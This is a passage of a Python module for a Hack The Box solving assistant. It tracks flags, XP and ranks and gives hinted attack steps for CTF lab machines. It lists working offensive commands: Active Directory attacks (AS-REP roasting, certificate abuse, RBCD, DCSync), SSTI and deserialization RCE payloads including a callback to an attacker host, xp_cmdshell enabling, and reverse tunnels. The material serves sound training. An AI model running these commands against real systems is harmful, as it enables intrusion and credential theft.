"""Hack The Box support — machines, challenges, flags, and XP.

What this is
------------
A guided solve loop. You spawn a box on your own account, point Merlon at it,
and at every step it tells you what it can see, what that implies, and the exact
command to run next. When you are stuck it will escalate a hint from a nudge to
the literal command — but every one of those hints is *derived from your own
scan of your own instance*, not looked up in an answer key.

What this deliberately is not
-----------------------------
There is no database of flags or solutions for active machines here, and there
will not be. Three reasons, in order of how much they should matter to you:

  1. It would not work. Flags on HTB are per-user and rotate; a stored flag is
     wrong the moment someone else's box respawns.
  2. It would get your account banned. Sharing solutions for active content is
     against HTB's rules, and submitting a flag you did not find is exactly
     what their anti-cheat looks for.
  3. It would defeat the point. Rank earned by copying is worth nothing in an
     interview, which is the only place the rank is ever spent.

The hint ladder below is the honest version of "just tell me the answer": it
tells you the answer *for the box in front of you*, worked out from evidence,
which is both allowed and more useful than a spoiler would be.

Retired machines are different — HTB permits writeups for those, and pointing
you at the official one is a link, not a leak. `writeup_policy()` draws that
line.

XP and ranks
------------
Figures come from HTB's own XP documentation (the system that replaced the old
Noob → Omniscient ladder). Ranks now run Beginner → Apprentice → Skilled →
Professional → Master → Prodigy → Grandmaster, each with grades I–III, rank
advancing every 15 levels, no level cap.

One deliberate omission: HTB says the XP-per-level curve is exponential but
does not publish the coefficients. So this module tracks XP earned and what to
play to reach a target — it does not guess at your level. A wrong level number
that looks authoritative is worse than no level number.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

# --------------------------------------------------------------------- flags

# Machine flags are a bare 32-hex string in /home/<user>/user.txt and
# /root/root.txt. That shape is also every MD5 digest ever printed, so a bare
# match is not evidence of anything on its own — `classify_flag` requires
# context before it will call one a flag.
MACHINE_FLAG = re.compile(r"\b[0-9a-f]{32}\b", re.I)

# Challenges, Sherlocks, Fortresses and the CTF platform all use the braces.
HTB_FLAG = re.compile(r"\bHTB\{[^}\n]{1,200}\}")

FLAG_FILES = ("user.txt", "root.txt", "flag.txt", "proof.txt")


def classify_flag(text: str, *, source: str = "") -> list[dict]:
    """Pull flag candidates out of text, with an honest confidence on each.

    `source` is the filename or command the text came from. It carries most of
    the weight: 32 hex characters read out of `/root/root.txt` is a root flag,
    while the same 32 characters in the output of `md5sum` is a hash. Without
    that context the candidate is reported at low confidence rather than
    suppressed, because a suppressed real flag costs more than a listed hash.
    """
    src = (source or "").lower()
    out: list[dict] = []

    for m in HTB_FLAG.findall(text or ""):
        out.append({
            "value": m, "kind": "htb", "confidence": 0.99,
            "why": "HTB{...} is unambiguous — nothing else uses that wrapper",
        })

    for m in MACHINE_FLAG.findall(text or ""):
        if any(f in src for f in FLAG_FILES):
            kind = "root" if "root" in src else "user"
            out.append({
                "value": m, "kind": kind, "confidence": 0.97,
                "why": f"32 hex characters read from {source} — that is the flag file",
            })
        elif any(h in src for h in ("md5", "hash", "digest", "sum")):
            continue  # a digest, and we know it
        else:
            out.append({
                "value": m, "kind": "unknown", "confidence": 0.35,
                "why": "32 hex characters, but this shape is also every MD5 — "
                       "confirm it came from user.txt or root.txt",
            })

    seen, unique = set(), []
    for f in out:
        if f["value"] not in seen:
            seen.add(f["value"])
            unique.append(f)
    return unique


# ------------------------------------------------------------------ XP model

# Verified against HTB's XP documentation. Machines award separately for the
# user and root flags, which is why partial progress is worth tracking.
MACHINE_XP = {
    "starting point": {"user": 100, "root": 150},
    "easy":           {"user": 200, "root": 250},
    "medium":         {"user": 300, "root": 350},
    "hard":           {"user": 400, "root": 450},
    "insane":         {"user": 500, "root": 550},
}

CHALLENGE_XP = {
    "very easy": 100, "easy": 200, "medium": 300, "hard": 400, "insane": 500,
}

# Sherlocks pay per task and again on completion.
SHERLOCK_XP = {
    "very easy": {"task": 15, "completion": 75},
    "easy":      {"task": 20, "completion": 175},
    "medium":    {"task": 30, "completion": 250},
    "hard":      {"task": 40, "completion": 325},
    "insane":    {"task": 50, "completion": 400},
}

ACTIVE_MULTIPLIER = 1.3     # content still in the active rotation
STREAK_XP_PER_WEEK = 200    # Monday 00:00 UTC → Sunday 23:59 UTC

RANKS = ["Beginner", "Apprentice", "Skilled", "Professional",
         "Master", "Prodigy", "Grandmaster"]
LEVELS_PER_RANK = 15


def xp_for(kind: str, difficulty: str, *, active: bool = False,
           root: bool = False, tasks: int = 0) -> int:
    """XP for one piece of content. Returns 0 for anything unrecognised."""
    d = (difficulty or "").strip().lower()
    base = 0

    if kind == "machine":
        row = MACHINE_XP.get(d)
        if row:
            base = row["user"] + (row["root"] if root else 0)
    elif kind == "challenge":
        base = CHALLENGE_XP.get(d, 0)
    elif kind == "sherlock":
        row = SHERLOCK_XP.get(d)
        if row:
            base = row["task"] * max(0, tasks) + row["completion"]

    return int(round(base * (ACTIVE_MULTIPLIER if active else 1.0)))


def week_bounds(now: datetime | None = None) -> tuple[datetime, datetime]:
    """The current streak week: Monday 00:00 UTC to Sunday 23:59:59 UTC."""
    now = (now or datetime.now(timezone.utc)).astimezone(timezone.utc)
    start = (now - timedelta(days=now.weekday())).replace(
        hour=0, minute=0, second=0, microsecond=0)
    return start, start + timedelta(days=7) - timedelta(seconds=1)


def streak_status(xp_this_week: int, now: datetime | None = None) -> dict:
    """How much more you need this week, and what would get you there.

    The streak is the one part of the XP system that is fully computable from
    published rules, and the one most easily lost by accident — it resets if
    you miss 200 XP in a calendar week, and the week ends Sunday at midnight
    UTC regardless of where you are.
    """
    start, end = week_bounds(now)
    now = (now or datetime.now(timezone.utc)).astimezone(timezone.utc)
    needed = max(0, STREAK_XP_PER_WEEK - max(0, xp_this_week))
    hours_left = max(0.0, (end - now).total_seconds() / 3600)

    if needed == 0:
        suggestion = "Streak is safe for this week."
    elif needed <= 100:
        suggestion = ("One Very Easy challenge (100 XP) closes the gap — "
                      "the cheapest way to bank a week.")
    elif needed <= 200:
        suggestion = ("One Easy challenge (200 XP), or the user flag on an "
                      "Easy machine (200 XP).")
    elif needed <= 260:
        suggestion = ("An active Easy machine's user flag pays 260 XP with the "
                      "1.3x active bonus — one box does it.")
    else:
        suggestion = (f"{needed} XP to go: a Medium machine rooted is 650 XP, "
                      f"or two Easy challenges.")

    return {
        "week_start": start.isoformat(),
        "week_end": end.isoformat(),
        "xp_this_week": max(0, xp_this_week),
        "xp_needed": needed,
        "safe": needed == 0,
        "hours_left": round(hours_left, 1),
        "urgent": needed > 0 and hours_left < 48,
        "suggestion": suggestion,
    }


def rank_label(level: int) -> dict:
    """Rank and grade for a level, from HTB's published progression.

    Level itself must come from HTB — the XP-to-level curve is not published,
    so this maps a level you already know rather than inventing one from XP.
    """
    level = max(1, int(level))
    idx = min((level - 1) // LEVELS_PER_RANK, len(RANKS) - 1)
    within = (level - 1) % LEVELS_PER_RANK
    grade = ["I", "II", "III"][min(within // 5, 2)]
    return {"rank": RANKS[idx], "grade": grade, "level": level,
            "label": f"{RANKS[idx]} {grade} · Lvl {level}"}


def plan_to_target(target_xp: int, *, prefer_active: bool = True) -> list[dict]:
    """Cheapest routes to a given amount of XP.

    Sorted by XP per box rather than by difficulty, because the fastest way to
    a target is usually not the hardest thing you can do — it is the thing you
    can finish.
    """
    mult = ACTIVE_MULTIPLIER if prefer_active else 1.0
    options = [
        ("Very Easy challenge", int(100 * mult), "minutes, if it is in your category"),
        ("Easy challenge", int(200 * mult), "usually under an hour"),
        ("Easy machine — user flag", int(200 * mult), "the standard evening box"),
        ("Easy machine — user + root", int(450 * mult), "one full box"),
        ("Medium machine — user + root", int(650 * mult), "a weekend box"),
        ("Hard machine — user + root", int(850 * mult), "several sessions"),
    ]
    out = []
    for name, xp, note in options:
        count = max(1, -(-target_xp // xp))    # ceiling division
        out.append({"route": name, "xp_each": xp, "count_needed": count,
                    "total": xp * count, "note": note})
    out.sort(key=lambda o: (o["count_needed"], -o["xp_each"]))
    return out


# ------------------------------------------------------------- machine phases

PHASES = [
    {"key": "recon", "label": "Recon",
     "done_when": "You know every open port and the version behind it",
     "trap": "Scanning only the top 1000 ports. HTB hides services high — "
             "always follow up with a full -p- sweep."},
    {"key": "enum", "label": "Service enumeration",
     "done_when": "Every service has been interrogated with its own protocol",
     "trap": "Reading nmap's guess instead of talking to the service. The "
             "version banner is a hint, not an answer."},
    {"key": "web", "label": "Web application",
     "done_when": "Every vhost, directory and parameter is mapped",
     "trap": "Missing a vhost. If port 80 redirects to a hostname, add it to "
             "/etc/hosts and scan again — that is a different application."},
    {"key": "foothold", "label": "Foothold",
     "done_when": "You have command execution as some user",
     "trap": "Chasing an exploit before exhausting default and reused "
             "credentials. Most easy boxes hand you a password somewhere."},
    {"key": "user", "label": "User flag",
     "done_when": "You have read /home/<user>/user.txt",
     "trap": "Landing as www-data and stopping. Enumerate for a real user's "
             "credentials before attacking root."},
    {"key": "privesc", "label": "Privilege escalation",
     "done_when": "You are root or SYSTEM",
     "trap": "Running an automated privesc script and reading only the red "
             "lines. The finding is often in the boring section."},
    {"key": "root", "label": "Root flag",
     "done_when": "You have read /root/root.txt",
     "trap": "Not taking notes as you go. The writeup is what turns a solved "
             "box into a skill you keep."},
]


# ------------------------------------------------- service knowledge base
#
# Each rule fires on evidence from the scan and produces a concrete action with
# a four-step hint ladder. The ladder is the point: level 1 makes you think,
# level 4 gives you the command, and you choose how much help you want.

DIFFICULTY_ORDER = ["starting point", "easy", "medium", "hard", "insane"]


@dataclass
class Rule:
    key: str
    phase: str
    ports: tuple[int, ...] = ()
    services: tuple[str, ...] = ()
    title: str = ""
    why: str = ""
    commands: list[str] = field(default_factory=list)
    look_for: list[str] = field(default_factory=list)
    ladder: list[str] = field(default_factory=list)
    weight: int = 50          # higher sorts first

    # Hard and insane boxes fail for different reasons than easy ones. The
    # failure on an easy box is missing an open port; on a hard box it is not
    # realising the foothold is a chain — three ordinary misconfigurations that
    # only matter together. Rules above "easy" stay hidden on easy boxes so the
    # common path is not buried under forest-level Active Directory advice.
    min_difficulty: str = "starting point"

    # Some techniques only make sense once you hold a credential or a shell.
    needs_creds: bool = False
    needs_shell: bool = False


RULES: list[Rule] = [
    Rule(
        key="full-port", phase="recon", ports=(), services=(),
        title="Sweep all 65535 ports before anything else",
        why="HTB routinely puts the interesting service on a high port. A "
            "top-1000 scan that finds 22 and 80 has not told you the box only "
            "runs 22 and 80.",
        commands=[
            "nmap -p- --min-rate 5000 -T4 -Pn -oA nmap/all {host}",
            "nmap -sC -sV -p$(cat nmap/all.nmap | grep ^[0-9] | cut -d/ -f1 | paste -sd,) -oA nmap/deep {host}",
        ],
        look_for=["ports above 1024", "anything not in the first scan"],
        ladder=[
            "Are you certain you have found every open port?",
            "The default nmap scan covers 1000 of 65535 ports.",
            "Run a full-range scan at a high rate, then a version scan on just the ports it finds.",
            "nmap -p- --min-rate 5000 -T4 -Pn {host}",
        ],
        weight=100,
    ),
    Rule(
        key="smb", phase="enum", ports=(139, 445), services=("smb", "microsoft-ds", "netbios-ssn"),
        title="Enumerate SMB shares, including as an anonymous user",
        why="Anonymous SMB is the single most common foothold on easy Windows "
            "boxes. Share names alone often reveal usernames and the theme of "
            "the intended path.",
        commands=[
            "smbclient -N -L //{host}/",
            "netexec smb {host} -u '' -p '' --shares",
            "netexec smb {host} -u guest -p '' --shares --users",
            "smbclient -N //{host}/<share>   # then: recurse ON; prompt OFF; mget *",
        ],
        look_for=["non-default shares", "READ access without credentials",
                  "usernames in share or file names", "config files with passwords"],
        ladder=[
            "SMB is open. Have you tried talking to it without credentials?",
            "SMB permits anonymous ('null') sessions unless it is configured not to.",
            "List the shares with a null session, then read anything marked READ.",
            "smbclient -N -L //{host}/   and then   netexec smb {host} -u '' -p '' --shares",
        ],
        weight=90,
    ),
    Rule(
        key="kerberos", phase="enum", ports=(88,), services=("kerberos", "kerberos-sec"),
        title="This is a domain controller — go after Kerberos",
        why="Port 88 means Active Directory. AS-REP roasting needs no "
            "credentials at all and is the standard opening on AD boxes.",
        commands=[
            "netexec smb {host} -u users.txt -p '' --continue-on-success",
            "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip {host} -no-pass",
            "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip {host} -request",
            "bloodhound-python -d <domain> -u <user> -p <pass> -ns {host} -c all",
        ],
        look_for=["users with pre-auth disabled", "service accounts with SPNs",
                  "the domain name from the LDAP or SMB banner"],
        ladder=[
            "Port 88 tells you something specific about this box. What is it?",
            "It is a domain controller, so AD attacks apply — some need no credentials.",
            "AS-REP roast any user with Kerberos pre-authentication disabled; you only need a username list.",
            "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip {host} -no-pass",
        ],
        weight=95,
    ),
    Rule(
        key="ldap", phase="enum", ports=(389, 636, 3268), services=("ldap", "ldapssl"),
        title="Dump LDAP anonymously for the domain and user list",
        why="Anonymous LDAP binds leak the full user list and often a password "
            "sitting in a description field — a genuinely common HTB foothold.",
        commands=[
            "ldapsearch -x -H ldap://{host} -s base namingcontexts",
            "ldapsearch -x -H ldap://{host} -b '<base-dn>' '(objectClass=person)'",
            "ldapsearch -x -H ldap://{host} -b '<base-dn>' | grep -i 'description\\|userPassword'",
        ],
        look_for=["naming contexts", "description fields", "userPassword attributes"],
        ladder=[
            "LDAP is open. Does it require a bind?",
            "Many AD boxes allow an anonymous bind that exposes the whole directory.",
            "Query the base DN anonymously, then grep the results for description fields — admins leave passwords there.",
            "ldapsearch -x -H ldap://{host} -b '<base-dn>' '(objectClass=person)' | grep -i description",
        ],
        weight=85,
    ),
    Rule(
        key="web", phase="web", ports=(80, 443, 8080, 8000, 8443, 8888, 5000, 3000),
        services=("http", "https", "http-proxy", "http-alt"),
        title="Map the web application: vhosts first, then content",
        why="A redirect to a hostname means name-based virtual hosting. If you "
            "scan the IP you are looking at a different site from the one the "
            "box intends you to see.",
        commands=[
            "curl -sI http://{host}/    # note any Location: header",
            "echo '{host} <hostname>' | sudo tee -a /etc/hosts",
            "ffuf -u http://{host}/ -H 'Host: FUZZ.<domain>' -w /opt/wordlists/subdomains-top1million-20000.txt -fs <size-of-default-response>",
            "feroxbuster -u http://<hostname>/ -w /opt/wordlists/raft-medium-directories.txt -x php,txt,html,bak -d 2",
            "whatweb -a 3 http://<hostname>/",
        ],
        look_for=["Location headers naming a hostname", "unusual response sizes",
                  "backup extensions", "framework version in headers or footers"],
        ladder=[
            "What hostname does the web server want you to use?",
            "A 301/302 to a name you cannot resolve means you need a /etc/hosts entry — and there may be more vhosts behind it.",
            "Add the hostname to /etc/hosts, then fuzz the Host header to find sibling vhosts before directory brute-forcing.",
            "ffuf -u http://{host}/ -H 'Host: FUZZ.<domain>' -w <subdomains.txt> -fs <default-size>",
        ],
        weight=88,
    ),
    Rule(
        key="ftp", phase="enum", ports=(21,), services=("ftp",),
        title="Try anonymous FTP",
        why="Costs one command. When it works it usually hands you either the "
            "web root or a credential file.",
        commands=[
            "ftp {host}    # user: anonymous, password: anything",
            "wget -m --no-passive ftp://anonymous:anonymous@{host}",
        ],
        look_for=["writable directories", "web root files", "config or backup files"],
        ladder=[
            "FTP is open — what is the cheapest thing to try?",
            "Anonymous login is enabled far more often than it should be.",
            "Log in as 'anonymous' with any password, then mirror everything.",
            "wget -m --no-passive ftp://anonymous:anonymous@{host}",
        ],
        weight=80,
    ),
    Rule(
        key="mssql", phase="enum", ports=(1433,), services=("ms-sql-s", "mssql"),
        title="MSSQL — check for command execution via xp_cmdshell",
        why="If you find any working credentials, MSSQL frequently converts "
            "them straight into a shell.",
        commands=[
            "netexec mssql {host} -u <user> -p <pass> --local-auth",
            "impacket-mssqlclient <user>:<pass>@{host} -windows-auth",
            "SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
        ],
        look_for=["sa with a weak password", "linked servers", "xp_cmdshell availability"],
        ladder=[
            "You have MSSQL. What does it give you that a web app would not?",
            "MSSQL can execute operating-system commands if the account is privileged.",
            "Connect with impacket-mssqlclient, then enable and use xp_cmdshell.",
            "impacket-mssqlclient <user>:<pass>@{host} -windows-auth    then    enable_xp_cmdshell",
        ],
        weight=82,
    ),
    Rule(
        key="winrm", phase="foothold", ports=(5985, 5986), services=("winrm", "wsman"),
        title="WinRM is open — any valid credential becomes a shell",
        why="5985 is the cleanest foothold on Windows. The moment you find a "
            "credential anywhere, try it here first.",
        commands=[
            "netexec winrm {host} -u <user> -p <pass>",
            "evil-winrm -i {host} -u <user> -p <pass>",
            "evil-winrm -i {host} -u <user> -H <ntlm-hash>",
        ],
        look_for=["'Pwn3d!' from netexec — that means it is a shell"],
        ladder=[
            "You have a credential and port 5985 is open. Connect the two.",
            "WinRM gives an interactive PowerShell session to any member of Remote Management Users.",
            "Validate with netexec first, then take the shell with evil-winrm.",
            "evil-winrm -i {host} -u <user> -p <pass>",
        ],
        weight=92,
    ),
    Rule(
        key="ssh", phase="foothold", ports=(22,), services=("ssh",),
        title="SSH — for credentials and keys you find elsewhere",
        why="Brute-forcing SSH on HTB is almost always the wrong path. Treat "
            "22 as the door you open once the key turns up in the web app.",
        commands=[
            "ssh <user>@{host}",
            "chmod 600 id_rsa && ssh -i id_rsa <user>@{host}",
            "ssh2john id_rsa > h.txt && john --wordlist=/opt/wordlists/rockyou.txt h.txt",
        ],
        look_for=["private keys in web directories or backups",
                  "passphrase-protected keys — crack them"],
        ladder=[
            "Do not brute-force this. What would legitimately give you SSH access?",
            "A key or password recovered from another service on the box.",
            "If you found an encrypted private key, crack the passphrase offline.",
            "ssh2john id_rsa > h.txt && john --wordlist=/opt/wordlists/rockyou.txt h.txt",
        ],
        weight=70,
    ),
    Rule(
        key="nfs", phase="enum", ports=(2049, 111), services=("nfs", "rpcbind"),
        title="List and mount NFS exports",
        why="An export with no_root_squash is a direct root path: create a "
            "setuid binary locally, run it on the target.",
        commands=[
            "showmount -e {host}",
            "sudo mount -t nfs {host}:/<export> /mnt/nfs -o nolock",
            "cat /mnt/nfs/etc/exports    # check for no_root_squash",
        ],
        look_for=["world-readable exports", "no_root_squash", "SSH keys in mounted homes"],
        ladder=[
            "NFS is exposed. What can you see without authenticating?",
            "Exports are often readable by anyone who can reach the port.",
            "List the exports and mount anything world-accessible.",
            "showmount -e {host}    then    sudo mount -t nfs {host}:/<export> /mnt/nfs -o nolock",
        ],
        weight=78,
    ),
    Rule(
        key="redis", phase="enum", ports=(6379,), services=("redis",),
        title="Unauthenticated Redis",
        why="Redis with no password lets you write files as the Redis user — "
            "usually an SSH key into a home directory.",
        commands=[
            "redis-cli -h {host} info",
            "redis-cli -h {host} config get dir",
            "redis-cli -h {host} --scan",
        ],
        look_for=["NOAUTH absent — that means no password", "the configured dir",
                  "keys holding credentials"],
        ladder=[
            "Redis answered you. Did it ask who you are?",
            "Unauthenticated Redis exposes both the data and the config.",
            "Read the config to find the working directory, then look at what you can write.",
            "redis-cli -h {host} config get dir",
        ],
        weight=76,
    ),
    Rule(
        key="snmp", phase="enum", ports=(161,), services=("snmp",),
        title="Walk SNMP with the default community string",
        why="'public' is still the default. SNMP leaks process lists — and "
            "process lists leak passwords passed on command lines.",
        commands=[
            "snmpwalk -v2c -c public {host}",
            "snmpwalk -v2c -c public {host} 1.3.6.1.2.1.25.4.2.1.5   # running processes",
            "onesixtyone {host} -c /opt/wordlists/snmp-community.txt",
        ],
        look_for=["process arguments containing passwords", "installed software", "usernames"],
        ladder=[
            "UDP 161 is open. There is a famous default here.",
            "The community string 'public' works on a surprising number of boxes.",
            "Walk the process table — passwords passed as command-line arguments are visible to SNMP.",
            "snmpwalk -v2c -c public {host} 1.3.6.1.2.1.25.4.2.1.5",
        ],
        weight=74,
    ),

    # ---------------------------------------------------------- hard tier
    #
    # From here down the rules assume the box does not have a single
    # vulnerability. The pattern on hard and insane machines is a chain: a
    # credential from one service, used against a second, to reach a third
    # that was never exposed. These rules are ordered to match that shape.

    Rule(
        key="spray", phase="foothold", min_difficulty="medium", needs_creds=True,
        title="Spray every credential you have against every service and user",
        why="The defining mistake on medium-and-up boxes is treating a "
            "credential as belonging to the service you found it on. Password "
            "reuse across accounts and protocols is the intended path more "
            "often than any exploit.",
        commands=[
            "netexec smb {host} -u users.txt -p passwords.txt --continue-on-success",
            "netexec winrm {host} -u users.txt -p passwords.txt --continue-on-success",
            "netexec ldap {host} -u users.txt -p passwords.txt --continue-on-success",
            "netexec mssql {host} -u users.txt -p passwords.txt --local-auth",
        ],
        look_for=["Pwn3d! on any protocol", "STATUS_PASSWORD_MUST_CHANGE — still a valid credential",
                  "one user whose password works on a second account"],
        ladder=[
            "You have at least one credential. Have you tried it everywhere, or only where you found it?",
            "Credential reuse across users and protocols is the standard chain link on these boxes.",
            "Build a users file and a passwords file from everything you have seen, then spray both across every service.",
            "netexec smb {host} -u users.txt -p passwords.txt --continue-on-success",
        ],
        weight=94,
    ),
    Rule(
        key="bloodhound", phase="foothold", ports=(88, 389), min_difficulty="medium",
        needs_creds=True,
        title="Map the domain with BloodHound before attacking anything",
        why="On an AD box the route to Domain Admin is a graph, not an exploit. "
            "Hard machines are built so that no single object is misconfigured "
            "badly — the path only appears when you can see the edges.",
        commands=[
            "bloodhound-python -d <domain> -u <user> -p <pass> -ns {host} -c all --zip",
            "netexec ldap {host} -u <user> -p <pass> --bloodhound --collection All --dns-server {host}",
            "# In the UI: mark your user Owned, then 'Shortest Path from Owned Principals'",
        ],
        look_for=["GenericWrite / GenericAll / WriteDacl on any principal",
                  "ForceChangePassword", "AddSelf on a group",
                  "AllowedToDelegate / AllowedToAct edges",
                  "sessions of privileged users on machines you control"],
        ladder=[
            "You have domain credentials. What do you not yet know about the domain?",
            "Which objects your user can modify — that is what decides the path, and it is not visible from a port scan.",
            "Collect all BloodHound data with your credential, mark yourself Owned, and run the shortest-path query.",
            "bloodhound-python -d <domain> -u <user> -p <pass> -ns {host} -c all --zip",
        ],
        weight=93,
    ),
    Rule(
        key="adcs", phase="foothold", ports=(88, 445), min_difficulty="hard",
        needs_creds=True,
        title="Check AD Certificate Services for ESC1–ESC8",
        why="Certificate template abuse is the dominant path on modern hard "
            "Windows boxes. A misconfigured template lets any domain user "
            "request a certificate as Domain Admin — and a certificate "
            "survives a password reset.",
        commands=[
            "certipy find -u <user>@<domain> -p <pass> -dc-ip {host} -vulnerable -stdout",
            "certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <tmpl> -upn administrator@<domain>",
            "certipy auth -pfx administrator.pfx -dc-ip {host}",
        ],
        look_for=["ESC1 — enrollee supplies subject", "ESC4 — template is writable",
                  "ESC8 — HTTP enrollment endpoint (NTLM relay)",
                  "a CA host in the certipy output"],
        ladder=[
            "Is there a certificate authority in this domain, and have you looked at its templates?",
            "Certificate templates are a privilege-escalation surface independent of group membership.",
            "Enumerate vulnerable templates with certipy, then request a certificate for a privileged UPN.",
            "certipy find -u <user>@<domain> -p <pass> -dc-ip {host} -vulnerable -stdout",
        ],
        weight=91,
    ),
    Rule(
        key="delegation", phase="foothold", ports=(88,), min_difficulty="hard",
        needs_creds=True,
        title="Look for Kerberos delegation — constrained, unconstrained, RBCD",
        why="Delegation converts control of one machine account into "
            "impersonation of any user. Resource-based constrained delegation "
            "in particular only needs GenericWrite on a computer object, which "
            "BloodHound will have already shown you.",
        commands=[
            "impacket-findDelegation <domain>/<user>:<pass> -dc-ip {host}",
            "# RBCD: add a computer, then set msDS-AllowedToActOnBehalfOfOtherIdentity",
            "impacket-addcomputer <domain>/<user>:<pass> -computer-name FAKE$ -computer-pass P@ss -dc-ip {host}",
            "impacket-rbcd -delegate-from FAKE$ -delegate-to <target$> -action write <domain>/<user>:<pass>",
            "impacket-getST -spn cifs/<target> -impersonate Administrator <domain>/FAKE$:P@ss",
        ],
        look_for=["TRUSTED_FOR_DELEGATION", "msDS-AllowedToDelegateTo",
                  "GenericWrite on a computer object", "MachineAccountQuota above 0"],
        ladder=[
            "BloodHound showed you write access over an object. What kind of object was it?",
            "Write access to a computer object enables resource-based constrained delegation.",
            "Create a computer account, set RBCD from it to the target, then request a service ticket impersonating Administrator.",
            "impacket-rbcd -delegate-from FAKE$ -delegate-to <target$> -action write <domain>/<user>:<pass>",
        ],
        weight=89,
    ),
    Rule(
        key="dcsync", phase="root", ports=(88,), min_difficulty="hard",
        needs_creds=True,
        title="DCSync once you hold replication rights",
        why="DS-Replication-Get-Changes plus -All means you can ask the domain "
            "controller for every hash in the domain without touching the "
            "disk. It is the end of most hard AD boxes.",
        commands=[
            "impacket-secretsdump <domain>/<user>:<pass>@{host} -just-dc-user Administrator",
            "impacket-secretsdump <domain>/<user>:<pass>@{host} -just-dc",
            "evil-winrm -i {host} -u Administrator -H <nthash>",
        ],
        look_for=["the Administrator NT hash", "krbtgt hash — golden ticket material"],
        ladder=[
            "You have replication rights. What can you ask the domain controller for?",
            "A DC will replicate password hashes to anything holding DS-Replication-Get-Changes-All.",
            "Dump the Administrator hash and pass it to WinRM — you do not need to crack it.",
            "impacket-secretsdump <domain>/<user>:<pass>@{host} -just-dc-user Administrator",
        ],
        weight=90,
    ),
    Rule(
        key="pivot", phase="privesc", min_difficulty="medium", needs_shell=True,
        title="Tunnel out the services bound to localhost",
        why="Hard boxes hide the vulnerable application behind 127.0.0.1 so it "
            "never appears in your port scan. If `ss -tlnp` shows a port your "
            "nmap did not, that gap is the rest of the box.",
        commands=[
            "ss -tlnp    # or netstat -ano on Windows — compare against your nmap",
            "ssh -L 8000:127.0.0.1:8000 <user>@{host}",
            "./chisel server -p 9001 --reverse    # attacker    ",
            "./chisel client <you>:9001 R:socks   # victim",
            "proxychains -q curl http://127.0.0.1:8000/",
        ],
        look_for=["listening ports absent from your nmap output",
                  "other hosts in the internal subnet", "docker bridge addresses"],
        ladder=[
            "Compare what the box says is listening with what your scan found. Do they agree?",
            "Services bound to loopback are invisible from outside and are usually the intended target.",
            "Forward the internal port to your machine, or run a SOCKS proxy and reach the whole internal network.",
            "ssh -L 8000:127.0.0.1:8000 <user>@{host}    (or chisel for a full SOCKS pivot)",
        ],
        weight=87,
    ),
    Rule(
        key="deserialize", phase="foothold", ports=(80, 443, 8080, 8000, 8443),
        min_difficulty="medium",
        title="Test any serialized blob for insecure deserialization",
        why="A cookie or parameter that base64-decodes to something structured "
            "— rO0AB for Java, AAEAAAD for .NET, O: for PHP, a pickle opcode "
            "for Python — is an RCE primitive, not a session token.",
        commands=[
            "echo '<blob>' | base64 -d | xxd | head",
            "java -jar ysoserial.jar CommonsCollections6 'curl <you>/x' | base64 -w0",
            "ysoserial.net -g TypeConfuseDelegate -f Json.Net -c 'cmd'",
            "python3 -c \"import pickle,base64;print(base64.b64encode(pickle.dumps(...)))\"",
        ],
        look_for=["rO0AB / H4sIA (gzipped Java)", "AAEAAAD///// (.NET)",
                  "O:8:\"stdClass\" (PHP)", "a lone 'gASV' or '\\x80\\x04' (Python pickle)"],
        ladder=[
            "Decode the tokens this application gives you. Are they random, or are they structured?",
            "A structured blob means the server is deserializing your input.",
            "Identify the language from the magic prefix, then generate a gadget chain for it.",
            "echo '<blob>' | base64 -d | xxd | head    — then match the prefix to a ysoserial payload",
        ],
        weight=84,
    ),
    Rule(
        key="ssti", phase="foothold", ports=(80, 443, 8080, 8000, 5000, 3000),
        min_difficulty="medium",
        title="Probe every reflected field for template injection",
        why="SSTI is the highest-yield web bug on medium and hard boxes because "
            "it goes straight from reflection to RCE, and it hides in places "
            "XSS payloads do not reach — error pages, PDF generators, email "
            "templates, filenames.",
        commands=[
            "# probe:  ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  {7*7}",
            "curl -sG '{host}' --data-urlencode 'q={{7*7}}' | grep -o 49",
            "# Jinja2 RCE:  {{ cycler.__init__.__globals__.os.popen('id').read() }}",
            "# Twig:        {{['id']|filter('system')}}",
            "tplmap -u 'http://{host}/?q=*'",
        ],
        look_for=["49 appearing where you sent 7*7", "a template stack trace",
                  "PDF or document generators", "anything that renders your name back"],
        ladder=[
            "Which fields does this application echo back to you, including in generated files?",
            "If any of them is rendered through a template engine, arithmetic will be evaluated.",
            "Send a polyglot arithmetic probe to every reflected field and look for the computed answer.",
            "Try  ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  and grep the response for 49",
        ],
        weight=86,
    ),
    Rule(
        key="custom-binary", phase="enum", min_difficulty="hard",
        title="Reverse the custom service on the non-standard port",
        why="An insane box with a bespoke daemon on a high port is telling you "
            "the intended path is protocol analysis, not a CVE. No scanner "
            "will fingerprint it, which is exactly why it is there.",
        commands=[
            "nc -nv {host} <port>    # speak to it; note the banner and error text",
            "nmap -sV --version-all -p <port> {host}",
            "# if you obtain the binary:",
            "file svc; strings -n 8 svc | less; checksec svc",
            "ltrace ./svc 2>&1 | head -50",
        ],
        look_for=["a hand-rolled protocol", "length fields you control",
                  "format strings echoed back", "a version banner with no public match"],
        ladder=[
            "One of these services was not identified by version detection. Why not?",
            "Because it is custom to this box — which means the vulnerability is in it, not in a library.",
            "Interact with it manually to learn the protocol, then get hold of the binary and look at how it parses input.",
            "nc -nv {host} <port>    then    strings -n 8 svc | less",
        ],
        weight=83,
    ),
    Rule(
        key="container-escape", phase="privesc", min_difficulty="hard", needs_shell=True,
        title="Check whether your shell is inside a container",
        why="Rooting a container is not rooting the box, and people lose hours "
            "to privesc scripts that succeed and change nothing. Confirm where "
            "you are before you start.",
        commands=[
            "cat /proc/1/cgroup; ls -la /.dockerenv",
            "cat /proc/self/status | grep CapEff     # 0000003fffffffff = privileged",
            "mount | grep -i docker; ls /var/run/docker.sock",
            "fdisk -l    # visible host disks mean you can mount them",
        ],
        look_for=["/.dockerenv", "docker or kubepods in cgroups",
                  "a mounted docker socket", "CAP_SYS_ADMIN", "host devices in /dev"],
        ladder=[
            "Does the filesystem you landed on look like the machine you scanned?",
